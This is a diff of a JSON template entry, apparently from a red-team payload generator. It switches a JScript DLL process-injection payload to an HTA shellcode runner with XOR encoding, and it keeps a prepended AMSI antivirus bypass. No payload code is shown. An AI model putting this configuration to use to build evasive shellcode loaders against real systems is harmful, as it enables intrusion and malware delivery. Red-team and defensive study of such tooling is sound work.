@@ -1,17 +1,19 @@
 {
-    "category" : ["jscript","dll","amsi"],
+    "category" : ["jscript","shellcode"],
     "description" : "JScript that runs a dll that does process injection0. Prepends an amsi bypass",
-    "contentFile" : "jscriptfromdllamsibypass.txt",
+    "contentFile" : "js_hta_shellcoderunner.txt",
     "customAttributes": [
         {
-            "name": "injectedProcess",
-            "description": "Process to inject into",
-            "defaultValue": "explorer"
+            "name": "xorByte",
+            "description": "The hex representation of the byte that the payload will be XOR'd with. Max 0xFF.",
+            "defaultValue": "0x22"
         }
     ],
+
     "shellCode" : {
         "hasShellCode":true,
-        "format" : "csharp"
+        "format" : "csharp",
+        "processor": "ep_csharp_xor"
                         
     },
     "compilation": {
@@ -26,7 +28,7 @@
             {
                 "name": "saveAs",
                 "description": "Name of library to be created, can be full path or just a name",
-                "defaultValue": "shell.dll"
+                "defaultValue": "/tmp/shell.dll"
             },
             {
                 "name": "format",
@@ -36,12 +38,10 @@
             {
                 "name": "saveJSAs",
                 "description": "Name of final file to be created, can be full path or just a name",
-                "defaultValue": "shell.hta"
+                "defaultValue": "/tmp/shell.hta"
             }
-        ],
-
-
-        
+        ],      
         "prepend" : "jsamsibypass"
+        
     }
 }
